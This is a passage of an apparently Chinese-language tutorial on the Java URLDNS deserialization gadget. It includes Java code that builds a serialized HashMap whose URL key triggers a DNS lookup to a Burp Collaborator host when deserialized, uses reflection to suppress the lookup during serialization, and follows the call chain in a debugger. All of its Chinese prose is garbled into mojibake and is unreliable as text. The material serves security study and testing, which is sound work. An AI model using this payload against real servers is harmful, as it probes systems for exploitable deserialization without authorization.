&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬æ¥è¿è¡Œä¸€ä¸‹å°±å¯ä»¥å‘ç°burpä¸Šé¢çš„Collaboratorè®°å½•äº†ä¸¤æ¡DNSçš„è®¿é—®ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸ºä»€ä¹ˆèƒ½è§¦å‘DNSè®¿é—®å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥Debugä¸€ä¸‹è§¦å‘çš„æµç¨‹ï¼š&lt;/p&gt;
&lt;p&gt;å…ˆåœ¨putçš„åœ°æ–¹ä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;è·Ÿåˆ°&lt;code&gt;put&lt;/code&gt;æ–¹æ³•ï¼Œè¿™é‡Œä¹Ÿè§£é‡Šä¸Šé¢ä¸ºä»€ä¹ˆè¦èµ‹ä¸¤ä¸ªå€¼äº†ï¼Œè€Œä¸”ç¬¬ä¸€ä¸ªå¿…é¡»æ˜¯URLçš„ç±»ï¼Œå› ä¸ºè¦æŠŠURLå¯¹è±¡ä¼ åˆ°hashæ–¹æ³•åˆ°ä¸­ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç»§ç»­è·Ÿ&lt;code&gt;hash&lt;/code&gt;æ–¹æ³•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¦‚æœ&lt;code&gt;key&lt;/code&gt;ä¸ç­‰äºç©ºï¼Œé‚£ä¹ˆå°±æ‰§è¡Œ&lt;code&gt;key&lt;/code&gt;çš„hashCodeæ–¹æ³•ï¼Œ&lt;code&gt;key&lt;/code&gt;æ˜¯ä¸€ä¸ªURLçš„å¯¹è±¡ï¼Œæ‰€ä»¥ä¼šè·³åˆ°URLç±»é‡Œé¢çš„hashCodeæ–¹æ³•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;åˆ¤æ–­å¦‚æœä¸ç­‰äº-1é‚£ä¹ˆå°±å¾€ä¸‹æ‰§è¡Œï¼Œè¿™é‡Œçš„hashCodeé»˜è®¤å°±æ˜¯-1ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿˜æœ‰ä¸‹é¢çš„handleræŒ‡å‘çš„æ˜¯&lt;code&gt;URLStreamHandler&lt;/code&gt;ç±»çš„hashCodeæ–¹æ³•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç»§ç»­å¾€ä¸‹è·Ÿ&lt;code&gt;getHostAddress&lt;/code&gt;æ–¹æ³•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/8.png&#34; alt=&#34;8&#34;&gt;&lt;/p&gt;
&lt;p&gt;åˆ°URLç±»ä¸­çš„&lt;code&gt; InetAddress.getByName&lt;/code&gt;æ–¹æ³•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/9.png&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸€èˆ¬åˆ°è¿™é‡Œå°±OKäº†ï¼Œå¦‚æœçœŸæƒ³ç»§ç»­è·Ÿä¸‹å»å°±ä¼šåˆ°&lt;code&gt;InetAddress&lt;/code&gt;ç±»ä¸­æ–¹æ³•æ‰è§¦å‘ï¼š&lt;/p&gt;
&lt;p&gt;&lt;code&gt;getAddressesFromNameService-&amp;gt;nameService.lookupAllHostAddr(host)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥çœ‹ä¸‹&lt;code&gt;getByName&lt;/code&gt;çš„å®˜æ–¹ä»‹ç»ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/10.png&#34; alt=&#34;10&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç»™ä¸€ä¸ªhost&amp;rsquo;s nameè¿”å›IPåœ°å€ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆæ•´ä¸ªçš„è¿‡ç¨‹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HashMap.put() -&amp;gt; HashMap.hash() -&amp;gt; java.net.URL.hashCode() -&amp;gt; URLStreamHandler.hashCode() -&amp;gt; URLStreamHandler.getHostAddress() -&amp;gt; InetAddress.getByName()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬å¯ä»¥çŸ¥é“æ‰§è¡Œä¸Šé¢çš„ä»£ç è¿›è¡Œåºåˆ—åŒ–çš„æ—¶å€™ä¹Ÿä¼šè§¦å‘DNSè¯·æ±‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆæ ·æ‰å¯ä»¥ä¸è§¦å‘ä»è€Œè¿›è¡Œåºåˆ—åŒ–å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬çš„å…³é”®ç‚¹è¿˜æ˜¯åœ¨HashMapä¸­çš„hashCodeæ–¹æ³•ä¸­ï¼Œåªè¦æˆ‘ä»¬è®¾ç½®hashCodeçš„å€¼ä¸ä¸º-1å³å¯ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬çŸ¥é“URLé‡Œé¢çš„hashCodeå€¼æ˜¯ç§æœ‰çš„ï¼Œæˆ‘ä»¬ä¸èƒ½é€šè¿‡å¯¹è±¡ç›´æ¥å†™å…¥å†…å®¹ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨Javaçš„&lt;code&gt;åå°„&lt;/code&gt;ç‰¹æ€§ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬åœ¨åŸæœ‰çš„åŸºç¡€ä¸ŠåŠ å…¥ä¸‹é¢çš„å†…å®¹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.FileOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.ObjectOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.lang.reflect.Field&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.net.URL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.util.HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;UrlDnsExp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;URL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;obj&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;URL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;URL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;URL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://hyji8wgb7eebb7rimnzf84prfil9mxb.oastify.com&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;clazz&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;forName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;java.net.URL&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Field&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;field&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;clazz&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getDeclaredField&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;hashCode&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;field&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setAccessible&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;field&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1234&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;obj&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;put&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;qwer&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;//åºåˆ—åŒ–
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;FileOutputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fo&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FileOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;dns.ser&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;ObjectOutputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;objectOutputStream&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ObjectOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fo&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;objectOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;writeObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;obj&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;objectOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åå°„è¿™å—å†…å®¹ç›¸ä¿¡å¤§å®¶å·²ç»å¾ˆç†Ÿæ‚‰äº†ï¼Œè·å–ç§æœ‰å±æ€§çš„æ—¶å€™è¦ä½¿ç”¨&lt;code&gt;getDeclaredField&lt;/code&gt;æ–¹æ³•ï¼Œè¿˜éœ€è¦&lt;code&gt;setAccessible&lt;/code&gt;æ¥è®¾ç½®è®¿é—®æƒé™ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬åªè¦è®¾ç½®URLç±»ä¸­çš„hashCodeä¸º-1å³å¯ï¼Œå†æ‰§è¡Œçš„æ—¶å€™æˆ‘ä»¬å·²ç»å‘ç°ä¸å†è§¦å‘DNSè¯·æ±‚äº†ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;å½“ä¸­è§¦å‘DNSè¯·æ±‚ä¸ºä»€ä¹ˆé€‰URLç±»ï¼Œå› ä¸ºURLç±»æ˜¯å¯è¢«åºåˆ—åŒ–çš„ï¼ŒHashMapä¹Ÿæ˜¯implementsäº†Serializableæ¥å£ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;ååºåˆ—åŒ–åˆ†æ&#34;&gt;ååºåˆ—åŒ–åˆ†æ&lt;/h2&gt;
&lt;p&gt;ç»è¿‡ä¸Šé¢çš„è¿‡ç¨‹åˆ†æä¹‹åå¤§å®¶ä¼°è®¡éƒ½ä¼šç–‘æƒ‘ï¼Œä¸ºä»€ä¹ˆè¦ç”¨&lt;code&gt;HashMap&lt;/code&gt;è¿™ä¸ªç±»å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;è¿™æ˜¯ä¸€ä¸ªéå¸¸å¥½çš„é—®é¢˜ï¼Œåˆå­¦è€…éƒ½ä¼šæœ‰è¿™æ ·çš„ç–‘æƒ‘ã€‚&lt;/p&gt;
&lt;p&gt;å¤§å®¶æœ‰æ²¡æœ‰è®°å¾—æˆ‘ä»¬åœ¨ç¬¬ä¸€ç« çš„ååºåˆ—åŒ–ä¸­æåˆ°è¿‡ï¼š&lt;/p&gt;
&lt;p&gt;&lt;code&gt;èƒ½è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ç±»éœ€è¦å®ç°Serializableæ¥å£ï¼Œæ­£å¥½HashMapå®ç°äº†è¿™ä¸ªæ¥å£ã€‚&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/11.png&#34; alt=&#34;11&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¹¶ä¸”&lt;code&gt;HashMap&lt;/code&gt;ç±»ä¹Ÿé‡å†™äº†readObjectæ–¹æ³•ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ç°åœ¨å…ˆæ¥å†™ä¸€ä¸ªååºåˆ—åŒ–çš„ä»£ç ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.FileInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.ObjectInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;UrlDnsRead&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;FileInputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fis&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FileInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;dns.ser&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;ObjectInputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ois&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ObjectInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fis&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;ois&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;readObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬æ‰§è¡Œä¹‹åå‘ç°å¹¶æ²¡æœ‰è¯·æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨URLç±»çš„hashCodeæ–¹æ³•ä¸­ä¸‹ä¸€ä¸ªæ–­ç‚¹è¿›è¡Œè°ƒè¯•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/12.png&#34; alt=&#34;12&#34;&gt;&lt;/p&gt;
&lt;p&gt;æœ‰äººä¼šå‘ç°æ‰§è¡Œåˆ°&lt;code&gt;handler&lt;/code&gt;çš„æ—¶å€™ä¼šç›´æ¥è·³åˆ°&lt;code&gt;URLStreamHandler&lt;/code&gt;çš„æŠ½è±¡ç±»å½“ä¸­ï¼Œå› ä¸ºåœ¨URLç±»ä¸­çš„215è¡Œè¿™ä¸ª&lt;code&gt;handler&lt;/code&gt;æ˜¯å±äºURLStreamHandlerç±»çš„ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥å‘ç°ç°åœ¨çš„hashCodeçš„å€¼æ˜¯æˆ‘ä»¬åœ¨åºåˆ—åŒ–çš„æ—¶å€™è®¾ç½®çš„å€¼ã€‚&lt;/p&gt;
&lt;p&gt;å› ä¸ºæˆ‘ä»¬åœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¸ºäº†ä¸è¯·æ±‚dnsï¼Œè®¾ç½®hashCodeä¸ä¸º-1äº†ï¼Œå½“hashCodeä¸º-1çš„æ—¶å€™æ‰èƒ½è§¦å‘dnsè¯·æ±‚ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥ä½¿ç”¨SerializationDumperæŸ¥çœ‹åºåˆ—åŒ–åçš„å€¼æ˜¯å¦è¢«å†™è¿›å»ï¼š&lt;/p&gt;
